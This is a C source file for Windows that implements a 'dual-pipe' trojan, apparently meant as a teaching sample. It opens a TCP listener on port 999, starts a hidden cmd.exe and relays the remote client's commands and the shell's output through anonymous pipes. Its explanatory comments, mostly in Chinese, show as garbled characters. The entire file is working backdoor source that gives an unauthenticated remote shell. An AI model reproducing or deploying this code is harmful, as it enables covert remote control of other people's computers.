// ˫�ܵ�ľ��

#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")
int main()
{
    WSADATA wsa;
    SOCKET listenFD;
    char Buff[1024];
    int ret;
	
	//WSAStartup(): The WSAStartup function initiates use of the Winsock DLL by a process.
    WSAStartup(MAKEWORD(2, 2), &wsa);
    listenFD = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(999);
    server.sin_addr.s_addr = ADDR_ANY;
    ret = bind(listenFD, (sockaddr *)&server, sizeof(server));
    ret = listen(listenFD, 2);
    int iAddrSize = sizeof(server);
    SOCKET clientFD = accept(listenFD, (sockaddr *)&server, &iAddrSize);
    /*
    ��δ�������������һ��Tcp Server�ģ�����������һ��socketfd��
    ʹ��999����㣬���ٶ��У���Ϊ���socket���ӵĶ˿ڣ�bind����
    Ȼ��������˿��ϵȴ�����listen������������accept����ֱ����
    client����������
    */
    SECURITY_ATTRIBUTES sa;
    sa.nLength = 12;
    sa.lpSecurityDescriptor = 0;
    sa.bInheritHandle = true;
    HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;
    ret = CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0);
    ret = CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0);
    /*
    �������������ܵ���hReadPipeֻ���������ܵ���hWritePipe1ֻ������д�ܵ���
    */
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hReadPipe2;
    si.hStdOutput = si.hStdError = hWritePipe1;
    char cmdLine[] = "cmd.exe";
    PROCESS_INFORMATION ProcessInformation;
    ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);
    /*
    ��δ��봴����һ��shell��cmd.exe�������Ұ�cmd.exe�ı�׼�����õڶ����ܵ���
    ������滻��cmd.exe�ı�׼����ͱ�׼��������õ�һ���ܵ���д����滻��
    �������ܵ����߼�ʾ��ͼ���£�
    (������)    read<���������ܵ�һ��<������write  ��׼���(cmd.exe�ӽ���)
    (������)   write������>���ܵ�����������>read   ��׼����(cmd.exe�ӽ���)
    */
    unsigned long lBytesRead;
    while(1)
    {
		//PeekNamedPipe(): Copies data from a named or anonymous pipe into a buffer without removing it from the pipe.
		//								It also returns information about data in the pipe.
        ret = PeekNamedPipe(hReadPipe1, Buff, 1024, &lBytesRead, 0, 0);
        if(lBytesRead)
        {
            ret = ReadFile(hReadPipe1, Buff, lBytesRead, &lBytesRead, 0);
            if(!ret) break;
            ret = send(clientFD, Buff, lBytesRead, 0);
            if(ret <= 0) break;
        }
        else
        {
            lBytesRead = recv(clientFD, Buff, 1024, 0);
            if(lBytesRead <= 0) break;
            ret = WriteFile(hWritePipe2, Buff, lBytesRead, &lBytesRead, 0);
            if(!ret) break;
        }
    }
    /*
    ��δ�������˿ͻ������shell�Ľ�����PeekNamedPipe�����첽�Ĳ�ѯ�ܵ�һ��
    ����shell�Ƿ������������о�readfile�������������͸��ͻ������û�У�
    ��ȥ���ܿͻ������롣��writefileд��ܵ����ݸ�shell.
    �������ܵ���client��server������߼�ͼ���£�
    ��������(Client) <-- send(������)    read<--���ܵ�һ��<--write  ��׼���
    (cmd.exe�ӽ���)
    ��ý��(Client) recv-->(������)write-->���ܵ�����-->read   ��׼����
    (cmd.exe�ӽ���)
    */
    return 0;
}
